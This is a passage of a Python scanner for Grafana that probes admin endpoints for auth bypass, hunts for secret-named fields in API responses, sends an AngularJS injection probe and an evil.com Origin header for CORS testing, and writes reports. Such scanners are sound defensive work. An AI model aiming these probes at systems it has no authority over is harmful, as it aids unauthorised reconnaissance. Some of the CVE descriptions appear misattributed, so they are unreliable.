        Severity: HIGH (CVSS 8.1)
        Impact: Unauthorized API access
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2023-2183'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        # Test for authentication bypass on protected endpoints
        bypass_endpoints = [
            '/api/admin/users',
            '/api/admin/ldap',
            '/api/admin/settings',
            '/api/admin/stats',
            '/api/org/users',
            '/api/org/preferences',
            '/api/teams/secrets',
            '/api/dashboards/permissions',
        ]
        
        accessible = []
        
        for endpoint in bypass_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if not response:
                    continue
                
                # If any of these return 200 without auth, that's a vulnerability
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, (list, dict)) and len(str(data)) > 10:
                            accessible.append(endpoint)
                    except:
                        if len(response.text) > 50:
                            accessible.append(endpoint)
                            
            except Exception:
                continue
        
        if accessible:
            self.stats['vulnerabilities_found'] += 1
            return True, f"Potential auth bypass - accessible endpoints: {', '.join(accessible)}", base_url + accessible[0]
        
        self.stats['checks_passed'] += 1
        return False, "Authentication controls appear functional", base_url
    
    def check_cve_2024_1313(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-1313: Information Disclosure via API
        
        Vulnerability: Sensitive information disclosure through API endpoints
        Affected: Multiple versions
        Severity: MEDIUM (CVSS 5.5)
        Impact: Exposure of environment variables and configuration
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-1313'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        # Check for information disclosure endpoints
        disclosure_endpoints = [
            '/api/frontend/settings',
            '/api/health',
            '/api/plugins',
            '/api/datasources',
            '/api/org/preferences',
            '/api/admin/settings',
        ]
        
        exposed_info = []
        
        for endpoint in disclosure_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url)
                
                if not response:
                    continue
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            # Check for sensitive information exposure
                            # Use word-boundary matching for substring terms to avoid false positives
                            # e.g. 'auth' should not match 'authorization', 'key' should not match 'monkey'
                            sensitive_keys = [
                                'secret', 'password', 'token',
                                'credential', 'private_key', 'access_key',
                                'secret_key', 'client_secret', 'database_password',
                                'api_key', 'apikey'
                            ]
                            # These broader terms need word-boundary matching
                            broad_keys = ['auth', 'key']
                            
                            def check_sensitive(obj, path=""):
                                findings = []
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        current_path = f"{path}.{key}" if path else key
                                        # Check if key name contains sensitive terms
                                        key_lower = key.lower()
                                        if any(s in key_lower for s in sensitive_keys):
                                            if value and isinstance(value, str) and len(str(value)) > 3:
                                                findings.append(f"{current_path}={str(value)[:20]}...")
                                        # Word-boundary matching for broad terms
                                        for bk in broad_keys:
                                            if re.search(r'\\b' + re.escape(bk) + r'\\b', key_lower):
                                                if value and isinstance(value, str) and len(str(value)) > 3 and not any(s in key_lower for s in sensitive_keys):
                                                    findings.append(f"{current_path}={str(value)[:20]}...")
                                                    break
                                        # Recurse into nested structures
                                        if isinstance(value, (dict, list)):
                                            findings.extend(check_sensitive(value, current_path))
                                elif isinstance(obj, list):
                                    for i, item in enumerate(obj):
                                        findings.extend(check_sensitive(item, f"{path}[{i}]"))
                                return findings
                            
                            findings = check_sensitive(data)
                            if findings:
                                exposed_info.extend(findings)
                                
                    except:
                        pass
                        
            except Exception:
                continue
        
        if exposed_info:
            self.stats['vulnerabilities_found'] += 1
            return True, f"Sensitive information disclosed: {'; '.join(exposed_info[:5])}", base_url + '/api/frontend/settings'
        
        self.stats['checks_passed'] += 1
        return False, "No significant information disclosure detected", base_url
    
    def check_cve_2024_8118(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-8118: Authentication Bypass via OAuth Flow
        
        Vulnerability: OAuth flow authentication bypass
        Affected: Grafana 11.0.x-11.1.7, 11.2.0-11.2.1
        Severity: CRITICAL (CVSS 9.0+)
        Impact: Authentication bypass
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-8118'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected", base_url
        
        # Check for OAuth configuration exposure
        oauth_endpoints = [
            '/api/login/oauth2',
            '/api/oauth2/test',
            '/login/oauth2',
        ]
        
        for endpoint in oauth_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self._safe_request('GET', test_url, allow_redirects=False)
                
                if response and response.status_code not in [404, 405]:
                    self.stats['vulnerabilities_found'] += 1
                    return True, (
                        f"OAuth endpoint accessible: {endpoint} (HTTP {response.status_code}). "
                        f"Potential auth bypass vector."
                    ), test_url
                    
            except Exception:
                continue
        
        self.stats['checks_passed'] += 1
        return False, "OAuth endpoints properly restricted", base_url
    
    def check_additional_cves(self, base_url: str) -> List[Tuple[bool, str, str, str]]:
        """
        Check remaining CVEs with simplified detection logic
        
        Returns list of tuples: (vulnerable, message, test_url, cve_id)
        """
        results = []
        
        # CVE-2020-11110: Stored XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2020-11110'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self._safe_request('GET', test_url)
                if r and r.status_code == 200:
                    # Validate it's actually returning snapshots data
                    try:
                        data = r.json()
                        if isinstance(data, (list, dict)) and len(str(data)) > 50:
                            results.append((True, "Snapshots API accessible - XSS vector available", test_url, "CVE-2020-11110"))
                            self.stats['vulnerabilities_found'] += 1
                        else:
                            results.append((False, "Snapshots API returned empty response", test_url, "CVE-2020-11110"))
                            self.stats['checks_passed'] += 1
                    except:
                        results.append((False, "Snapshots API returned non-JSON response", test_url, "CVE-2020-11110"))
                        self.stats['checks_passed'] += 1
                elif r and r.status_code in [401, 403]:
                    results.append((False, "Snapshots API requires authentication", test_url, "CVE-2020-11110"))
                    self.stats['checks_passed'] += 1
                else:
                    results.append((False, "Snapshots API not accessible", test_url, "CVE-2020-11110"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2020-11110"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2020-11110"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-41174: AngularJS XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-41174'):
            payload = quote("{{constructor.constructor('return 1337')()")
            test_url = urljoin(base_url, f"/dashboard/snapshot/{payload}?orgId=1")
            try:
                r = self._safe_request('GET', test_url, allow_redirects=False)
                if r and r.status_code == 200 and "constructor" in r.text:
                    results.append((True, "AngularJS expression injection possible", test_url, "CVE-2021-41174"))
                    self.stats['vulnerabilities_found'] += 1
                elif r and r.status_code in [404, 410]:
                    results.append((False, "AngularJS sanitization active", test_url, "CVE-2021-41174"))
                    self.stats['checks_passed'] += 1
                else:
                    results.append((False, f"AngularJS test returned HTTP {r.status_code if r else 'N/A'}", test_url, "CVE-2021-41174"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-41174"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-41174"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-27358: DoS via Snapshots
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-27358'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self._safe_request('POST', test_url, json={"name": "test"}, allow_redirects=False)
                if r and r.status_code not in [401, 403, 404, 405]:
                    results.append((True, "Unauthenticated POST to snapshots - DoS vector", test_url, "CVE-2021-27358"))
                    self.stats['vulnerabilities_found'] += 1
                else:
                    results.append((False, f"Snapshots POST restricted (HTTP {r.status_code if r else 'N/A'})", test_url, "CVE-2021-27358"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-27358"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-27358"))
            self.stats['checks_passed'] += 1
        
        # CVE-2022-32275 & CVE-2022-32276
        for cve_id in ['CVE-2022-32275', 'CVE-2022-32276']:
            self.stats['total_checks'] += 1
            if self.is_version_vulnerable(cve_id):
                results.append((False, "Specific to v8.4.3 - requires manual validation", base_url, cve_id))
                self.stats['checks_passed'] += 1
            else:
                results.append((False, f"Version {self.grafana_version} not affected", base_url, cve_id))
                self.stats['checks_passed'] += 1
        
        return results
    
    def check_security_headers(self, base_url: str) -> Dict:
        """
        Analyze HTTP security headers
        
        Checks for:
        - Content-Security-Policy
        - X-Content-Type-Options
        - X-Frame-Options
        - Strict-Transport-Security
        - X-XSS-Protection
        """
        security_headers = {
            'Content-Security-Policy': {
                'severity': 'MEDIUM',
                'description': 'Controls resource loading policies',
                'recommended': True
            },
            'X-Content-Type-Options': {
                'severity': 'LOW',
                'description': 'Prevents MIME type sniffing',
                'recommended': 'nosniff'
            },
            'X-Frame-Options': {
                'severity': 'MEDIUM',
                'description': 'Prevents clickjacking attacks',
                'recommended': 'DENY'
            },
            'Strict-Transport-Security': {
                'severity': 'MEDIUM',
                'description': 'Enforces HTTPS connections',
                'recommended': True
            },
            'X-XSS-Protection': {
                'severity': 'LOW',
                'description': 'Cross-site scripting filter',
                'recommended': '1; mode=block'
            }
        }
        
        try:
            response = self._safe_request('GET', base_url)
            if not response:
                return {}
            
            headers = {k.lower(): v for k, v in response.headers.items()}
            results = {}
            
            for header, info in security_headers.items():
                header_lower = header.lower()
                if header_lower in headers:
                    results[header] = {
                        'present': True,
                        'value': headers[header_lower],
                        'severity': 'SAFE',
                        'message': f"Security header present: {header}: {headers[header_lower][:50]}"
                    }
                else:
                    results[header] = {
                        'present': False,
                        'severity': info['severity'],
                        'message': f"Missing security header: {header} ({info['description']})"
                    }
            
            return results
            
        except Exception:
            return {}
    
    def check_cors_misconfiguration(self, base_url: str) -> Dict:
        """
        Check for CORS misconfiguration
        """
        try:
            parsed = urlparse(base_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"
            evil_origin = "https://evil.com"
            
            headers = {
                'Origin': evil_origin,
                'Referer': f"{evil_origin}/test"
            }
            
            response = self._safe_request('GET', base_url, headers=headers)
            
            if not response:
                return {}
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            result = {
                'checked': True,
                'reflection': False,
                'wildcard': False,
            }
            
            if acao == '*':
                result['wildcard'] = True
                result['severity'] = 'MEDIUM'
                result['message'] = 'CORS wildcard allowed - any origin can access resources'
            elif acao == evil_origin:
                result['reflection'] = True
                result['severity'] = 'MEDIUM'
                result['message'] = 'CORS reflects origin header - potential misconfiguration'
            elif acao:
                result['severity'] = 'INFO'
                result['message'] = f'CORS restricted to: {acao}'
            else:
                result['severity'] = 'SAFE'
                result['message'] = 'No CORS headers detected'
            
            if acac and acac.lower() == 'true' and (result.get('reflection') or result.get('wildcard')):
                result['severity'] = 'HIGH'
                result['message'] += ' - with credentials! Potential account takeover risk'
            
            return result
            
        except Exception:
            return {}
    
    def check_security_config(self, base_url: str) -> Dict:
        """
        Analyze security configuration and information disclosure
        
        Checks:
        - Anonymous access status
        - Metrics endpoint exposure
        - Plugin installation permissions
        - Build information disclosure
        - Security headers
        - CORS configuration
        - API key exposure
        - Signup availability
        """
        config_results = {}
        
        # Anonymous Access
        try:
            url = urljoin(base_url, "/api/frontend/settings")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict):
                        anon_enabled = data.get('anonymousEnabled', False) or data.get('anonymous', {}).get('enabled', False)
                        config_results['anonymous_access'] = {
                            'enabled': anon_enabled,
                            'severity': 'MEDIUM' if anon_enabled else 'INFO',
                            'message': 'Anonymous access ENABLED - unauthenticated viewing possible' if anon_enabled else 'Anonymous access disabled',
                            'url': url
                        }
                    else:
                        config_results['anonymous_access'] = {'enabled': None, 'severity': 'INFO', 'message': 'Could not parse settings (unexpected format)', 'url': url}
                except:
                    config_results['anonymous_access'] = {'enabled': None, 'severity': 'INFO', 'message': 'Could not parse settings (non-JSON response)', 'url': url}
            elif r:
                config_results['anonymous_access'] = {'enabled': False, 'severity': 'INFO', 'message': f'Settings endpoint requires authentication (HTTP {r.status_code})', 'url': url}
        except:
            pass
        
        # Metrics Exposure
        for metrics_path in ['/metrics', '/api/prometheus/metrics']:
            try:
                url = urljoin(base_url, metrics_path)
                r = self._safe_request('GET', url)
                if r and r.status_code == 200:
                    if "# TYPE" in r.text or "# HELP" in r.text:
                        config_results['metrics'] = {
                            'exposed': True,
                            'path': metrics_path,
                            'severity': 'LOW',
                            'message': f'Prometheus metrics endpoint exposed ({metrics_path}) - system information disclosure',
                            'url': url
                        }
                        break
            except:
                continue
        
        if 'metrics' not in config_results:
            config_results['metrics'] = {
                'exposed': False,
                'severity': 'INFO',
                'message': 'Metrics endpoints not exposed',
                'url': base_url
            }
        
        # Plugin Information
        try:
            url = urljoin(base_url, "/api/plugins")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    plugins = r.json()
                    if isinstance(plugins, list):
                        unsigned = [p for p in plugins if 'unsigned' in str(p.get('signature', '')).lower()]
                        self.detected_plugins = [p.get('id', 'unknown') for p in plugins if isinstance(p, dict)]
                        config_results['plugins'] = {
                            'count': len(plugins),
                            'unsigned_count': len(unsigned),
                            'severity': 'MEDIUM' if unsigned else 'INFO',
                            'message': f"{len(plugins)} plugins installed ({len(unsigned)} unsigned)" if unsigned else f"{len(plugins)} plugins installed, all signed",
                            'url': url
                        }
                except:
                    pass
        except:
            pass
        
        # Signup Availability
        try:
            url = urljoin(base_url, "/api/user/signup")
            r = self._safe_request('GET', url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict) and data.get('enabled', False):
                        config_results['signup'] = {
                            'enabled': True,
                            'severity': 'MEDIUM',
                            'message': 'User self-signup is ENABLED - unauthorized users can register',
                            'url': url
                        }
                except:
                    pass
        except:
            pass
        
        # Security Headers
        header_results = self.check_security_headers(base_url)
        if header_results:
            missing_headers = [h for h, info in header_results.items() if not info.get('present')]
            if missing_headers:
                config_results['security_headers'] = {
                    'severity': 'LOW',
                    'missing': missing_headers,
                    'message': f"Missing security headers ({len(missing_headers)}): {', '.join(missing_headers)}"
                }
        
        # CORS Check
        cors_result = self.check_cors_misconfiguration(base_url)
        if cors_result and cors_result.get('checked'):
            config_results['cors'] = cors_result
        
        return config_results
    
    def scan_target(self, url: str) -> Dict:
        """
        Perform comprehensive security assessment of target
        
        Execution flow:
        1. Connectivity verification
        2. Version fingerprinting
        3. CVE vulnerability testing
        4. Configuration security analysis
        5. Results compilation and reporting
        
        Returns:
            Dictionary containing scan results, vulnerabilities, and metadata
        """
        # Reset statistics for this target
        self.stats = {'total_checks': 0, 'vulnerabilities_found': 0, 'checks_passed': 0, 'errors': 0}
        self._rate_limited = False
        
        # Header
        with self._print_lock:
            print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}TARGET ASSESSMENT{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.UNDERLINE}{url}{Colors.RESET}")
            print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
        
        # Normalize URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'version': None,
            'build_info': {},
            'vulnerabilities': [],
            'configuration': {},
            'statistics': {},
            'accessible': False,
            'interrupted': False
        }
        try:
            # Phase 1: Connectivity
            self.log("Phase 1: Connectivity Verification", "INFO")
            try:
                response = self._safe_request('GET', url, allow_redirects=True)
                if response:
                    results['accessible'] = True
                    self.log(f"Target reachable (HTTP {response.status_code})", "SUCCESS", 1)
                else:
                    self.log("Target unreachable - check URL and network connectivity", "ERROR", 1)
                    return results
            except requests.exceptions.SSLError:
                self.log("SSL certificate validation failed - use --no-ssl-verify for self-signed certificates", "ERROR", 1)
                return results
            except requests.exceptions.Timeout:
                self.log(f"Connection timeout ({self.timeout}s) - target may be slow or blocking requests", "ERROR", 1)
                return results
            except requests.exceptions.ConnectionError as e:
                self.log(f"Connection refused: {str(e)}", "ERROR", 1)
                return results
            except Exception as e:
                self.log(f"Unexpected error: {str(e)}", "ERROR", 1)
                return results

            # Phase 2: Version Detection
            print()
            self.log("Phase 2: Version Fingerprinting", "INFO")
            version = self.detect_grafana_version(url)
            results['version'] = version
            results['build_info'] = self.build_info

            # Phase 3: Vulnerability Assessment
            print()
            self.log("Phase 3: Vulnerability Scanning", "INFO")
            print()

            # Critical CVEs
            cve_checks = [
                ("CVE-2025-4123", "CRITICAL", "Path Traversal & Open Redirect", self.check_cve_2025_4123),
                ("CVE-2024-9264", "CRITICAL", "DuckDB SQL Injection (RCE)", self.check_cve_2024_9264),
                ("CVE-2024-8118", "CRITICAL", "OAuth Authentication Bypass", self.check_cve_2024_8118),
                ("CVE-2021-43798", "CRITICAL", "Directory Traversal", self.check_cve_2021_43798),
                ("CVE-2023-50164", "HIGH", "Plugin Path Traversal", self.check_cve_2023_50164),
                ("CVE-2023-1410", "HIGH", "SSRF via Data Source Proxy", self.check_cve_2023_1410),
                ("CVE-2023-2183", "HIGH", "Authentication Bypass", self.check_cve_2023_2183),
                ("CVE-2018-15727", "HIGH", "Authentication Bypass (Cookie)", self.check_cve_2018_15727),
                ("CVE-2021-39226", "MEDIUM", "Snapshot Enumeration", self.check_cve_2021_39226),
                ("CVE-2024-1313", "MEDIUM", "Information Disclosure", self.check_cve_2024_1313),
            ]

            interrupted = False
            if self.max_threads > 1 and len(cve_checks) > 1:
                interrupted = self._run_cve_checks_parallel(cve_checks, url, results)
            else:
                for cve_id, severity, description, check_func in cve_checks:
                    self._run_single_cve_check(cve_id, severity, description, check_func, url, results)

            if not interrupted:
                # Additional CVEs
                for vulnerable, message, test_url, cve_id in self.check_additional_cves(url):
                    if vulnerable:
                        severity = "MEDIUM" if "2020" in cve_id or "2021" in cve_id else "LOW"
                        self._report_vulnerability(cve_id, severity, message, test_url, results)
                    elif self.verbose:
                        self.log(f"{cve_id:18} {message}", "SAFE", 1)

                # Phase 4: Configuration Analysis
                print()
                self.log("Phase 4: Security Configuration Analysis", "INFO")
                config = self.check_security_config(url)
                results['configuration'] = config

                for check_name, check_data in config.items():
                    severity = check_data.get('severity', 'INFO')
                    if severity in ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']:
                        self.log(check_data.get('message', str(check_data)), severity, 1)
                        if 'url' in check_data:
                            self.log(f"└─ Endpoint: {Colors.DIM}{check_data['url']}{Colors.RESET}", severity, 2)

            results['interrupted'] = interrupted
        except KeyboardInterrupt:
            results['interrupted'] = True
            self.log("Scan interrupted by user - returning partial results", "WARN", 1)

        # Final Statistics
        results['statistics'] = self.stats
        
        # Print statistics
        print()
        self.log("Scan Statistics:", "INFO")
        self.log(f"Total checks: {self.stats['total_checks']}", "INFO", 1)
        self.log(f"Vulnerabilities: {self.stats['vulnerabilities_found']}", 
                 "CRITICAL" if self.stats['vulnerabilities_found'] > 0 else "SUCCESS", 1)
        self.log(f"Checks passed: {self.stats['checks_passed']}", "SUCCESS", 1)
        if self.stats['errors'] > 0:
            self.log(f"Errors: {self.stats['errors']}", "WARN", 1)
        if results.get('interrupted'):
            self.log("Partial results only - scan was interrupted", "WARN", 1)
        
        return results
    
    def _run_cve_checks_parallel(self, cve_checks: List[Tuple], url: str, results: Dict):
        """Run CVE checks in parallel using thread pool"""
        def run_check(check_info):
            cve_id, severity, description, check_func = check_info
            try:
                vulnerable, message, test_url = check_func(url)
                return cve_id, severity, description, vulnerable, message, test_url
            except Exception as e:
                return cve_id, severity, description, False, f"Error: {str(e)}", url

        executor = concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads)
        futures = {executor.submit(run_check, check): check for check in cve_checks}

        interrupted = False
        try:
            for future in concurrent.futures.as_completed(futures):
                cve_id, severity, description, vulnerable, message, test_url = future.result()

                if vulnerable:
                    self._report_vulnerability(cve_id, severity, message, test_url, results, description)
                elif self.verbose:
                    self.log(f"{cve_id:18} {message}", "SAFE", 1)
        except KeyboardInterrupt:
            interrupted = True
            self.log("Interrupt received - cancelling remaining CVE checks", "WARN", 2)
            for future in futures:
                future.cancel()
        finally:
            executor.shutdown(wait=not interrupted, cancel_futures=interrupted)

        return interrupted
    
    def _run_single_cve_check(self, cve_id: str, severity: str, description: str,
                              check_func, url: str, results: Dict):
        """Run a single CVE check"""
        try:
            vulnerable, message, test_url = check_func(url)
            
            if vulnerable:
                self._report_vulnerability(cve_id, severity, message, test_url, results, description)
            elif self.verbose:
                self.log(f"{cve_id:18} {message}", "SAFE", 1)
        except Exception as e:
            if self.verbose:
                self.log(f"{cve_id:18} Error: {str(e)}", "ERROR", 1)
    
    def _report_vulnerability(self, cve_id: str, severity: str, message: str, 
                              test_url: str, results: Dict, description: Optional[str] = None):
        """Report a vulnerability finding"""
        color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 
                 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}.get(severity, Colors.INFO)
        
        description_str = f" {description}" if description else ""
        self.log(f"{cve_id:18}{description_str}", severity, 1)
        self.log(f"└─ {message}", severity, 2)
        self.log(f"└─ Test URL: {Colors.DIM}{test_url}{Colors.RESET}", severity, 2)
        print()
        
        results['vulnerabilities'].append({
            'cve_id': cve_id,
            'severity': severity,
            'description': description or message,
            'message': message,
            'test_url': test_url
        })
    
    def scan_from_file(self, filename: str) -> List[Dict]:
        """
        Scan multiple targets from file
        
        File format: One URL per line, # for comments
        """
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            self.log(f"Loaded {len(urls)} targets from {filename}", "INFO")
            
            results = []
            for i, url in enumerate(urls, 1):
                print(f"\n{Colors.BOLD}[Target {i}/{len(urls)}]{Colors.RESET}")
                result = self.scan_target(url)
                results.append(result)

                if result.get('interrupted'):
                    self.log("Batch scan interrupted - returning partial results", "WARN")
                    break
                
                if i < len(urls) and not self._rate_limited:
                    time.sleep(1)  # Polite delay between targets
            
            return results

        except KeyboardInterrupt:
            self.log("Batch scan interrupted - returning partial results", "WARN")
            return results
            
        except FileNotFoundError:
            self.log(f"File not found: {filename}", "ERROR")
            sys.exit(1)
        except Exception as e:
            self.log(f"Error reading file: {str(e)}", "ERROR")
            sys.exit(1)
    
    def generate_report(self, results: List[Dict], output_file: Optional[str] = None):
        """
        Generate comprehensive assessment report
        """
        print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
        print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}ASSESSMENT SUMMARY{Colors.RESET}")
        print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")

        if any(result.get('interrupted') for result in results):
            print(f"{Colors.WARN}[!] Partial report generated after user interruption{Colors.RESET}\n")
        
        # Statistics
        total_targets = len(results)
        vulnerable_targets = sum(1 for r in results if r['vulnerabilities'])
        accessible_targets = sum(1 for r in results if r.get('accessible'))
        
        severity_counts = defaultdict(int)
        for result in results:
            for vuln in result['vulnerabilities']:
                severity_counts[vuln['severity']] += 1
        
        # Summary
        print(f"Targets Scanned:      {Colors.BOLD}{total_targets}{Colors.RESET}")
        print(f"Targets Reachable:    {Colors.SUCCESS if accessible_targets == total_targets else Colors.WARN}{Colors.BOLD}{accessible_targets}{Colors.RESET}")
        print(f"Vulnerable Targets:   {Colors.CRITICAL if vulnerable_targets > 0 else Colors.SUCCESS}{Colors.BOLD}{vulnerable_targets}{Colors.RESET}")
        print(f"Secure Targets:       {Colors.SUCCESS}{Colors.BOLD}{total_targets - vulnerable_targets}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}Vulnerability Distribution:{Colors.RESET}")
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                print(f"  {symbol} {color}{severity:10} {count:3}{Colors.RESET}")
            else:
                print(f"  ✓ {Colors.DIM}{severity:10}   0{Colors.RESET}")
        
        # Detailed Findings
        if vulnerable_targets > 0:
            print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}DETAILED FINDINGS{Colors.RESET}")
            print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
            
            for result in results:
                if result['vulnerabilities']:
                    print(f"{Colors.VULN}▶{Colors.RESET} {Colors.BOLD}{result['url']}{Colors.RESET}")
                    if result['version']:
                        print(f"  {Colors.DIM}Version: Grafana v{result['version']}{Colors.RESET}")
                    
                    # Group by severity
                    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                        vulns = [v for v in result['vulnerabilities'] if v['severity'] == severity]
                        
                        if vulns:
                            for vuln in vulns:
                                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                                
                                print(f"\n  {symbol} {color}[{severity}] {vuln['cve_id']}{Colors.RESET}")
                                print(f"     └─ {vuln['message']}")
                                print(f"     └─ {Colors.DIM}{vuln['test_url']}{Colors.RESET}")
                    
                    print()
        else:
            print(f"\n{Colors.SUCCESS}✓ All scanned targets appear secure{Colors.RESET}")
        
        # Save reports
        base_filename = None
        if output_file:
            base_filename = self._get_next_report_base_filename(output_file)
        
        if base_filename:
            self._save_json_report(results, f"{base_filename}.json")
            self._save_html_report(results, f"{base_filename}.html")
            self._save_csv_report(results, f"{base_filename}.csv")

    def _get_next_report_base_filename(self, output_file: str) -> str:
        """Return the next available numbered report basename."""
        base_filename = output_file
        for extension in ('.json', '.html', '.csv'):
            if base_filename.lower().endswith(extension):
                base_filename = base_filename[:-len(extension)]
                break

        directory = os.path.dirname(base_filename)
        stem = os.path.basename(base_filename)
        counter = 1001

        while True:
            candidate_stem = f"{stem}_{counter}"
            candidate_base = os.path.join(directory, candidate_stem) if directory else candidate_stem
            candidate_files = [f"{candidate_base}.json", f"{candidate_base}.html", f"{candidate_base}.csv"]

            if not any(os.path.exists(candidate_file) for candidate_file in candidate_files):
                return candidate_base

            counter += 1
    
    def _save_json_report(self, results: List[Dict], filename: str):
        """Save JSON format report"""
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            print(f"\n{Colors.SUCCESS}[+] JSON report saved: {filename}{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.CRITICAL}[-] Error saving JSON report: {str(e)}{Colors.RESET}")
    
    def _save_html_report(self, results: List[Dict], filename: str):
        """Save HTML format report"""
        try:
            total_vulns = sum(len(r['vulnerabilities']) for r in results)
            total_targets = len(results)
            vulnerable_targets = sum(1 for r in results if r['vulnerabilities'])
            
            # Build vulnerability detail rows
            vuln_rows = ""
            for result in results:
                if result['vulnerabilities']:
                    for vuln in result['vulnerabilities']:
                        severity_color = {
                            'CRITICAL': '#dc3545',
                            'HIGH': '#fd7e14',
                            'MEDIUM': '#ffc107',
                            'LOW': '#0dcaf0'
                        }.get(vuln['severity'], '#6c757d')
                        
                        esc_url = html.escape(result['url'])
                        esc_version = html.escape(result.get('version', 'Unknown') or 'Unknown')
                        esc_severity = html.escape(vuln['severity'])
                        esc_cve = html.escape(vuln['cve_id'])
                        esc_msg = html.escape(vuln['message'][:80])
                        esc_test_url = html.escape(vuln.get('test_url', '#'))
                        
                        vuln_rows += f"""
                        <tr>
                            <td><a href="{esc_url}" target="_blank">{esc_url[:60]}...</a></td>
                            <td>{esc_version}</td>
                            <td><span class="badge" style="background-color: {severity_color}">{esc_severity}</span></td>
                            <td><code>{esc_cve}</code></td>
                            <td>{esc_msg}</td>
                            <td><small><a href="{esc_test_url}" target="_blank">Link</a></small></td>
                        </tr>"""
            
            # Pre-compute the no-vulns row to avoid nested f-string expression issues
            if not vuln_rows:
                vuln_rows_html = '<tr><td colspan="6" style="text-align: center; padding: 30px; color: #888;">No vulnerabilities detected</td></tr>'
            else:
                vuln_rows_html = vuln_rows
            
            html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grafana Security Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f1a; color: #e0e0e0; padding: 20px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 30px; border-radius: 10px; margin-bottom: 30px; border: 1px solid #2a2a4a; }}
        .header h1 {{ color: #ff4444; font-size: 28px; }}
        .header p {{ color: #888; margin-top: 10px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; padding: 20px; border-radius: 8px; text-align: center; border: 1px solid #2a2a4a; }}
